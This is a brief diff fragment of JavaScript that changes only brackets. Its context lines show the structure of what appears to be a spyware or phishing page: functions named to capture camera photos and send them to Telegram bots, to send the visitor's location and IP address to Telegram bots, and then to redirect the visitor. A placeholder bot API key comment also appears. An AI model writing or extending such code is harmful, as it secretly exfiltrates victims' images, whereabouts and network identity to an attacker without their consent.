@@ -36,9 +36,8 @@ captureAndSendPhotosToTelegramBots();
 redirectToNextURL();
 //////1//////
         }
-      }
-    );
-  });
+    }
+  );
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
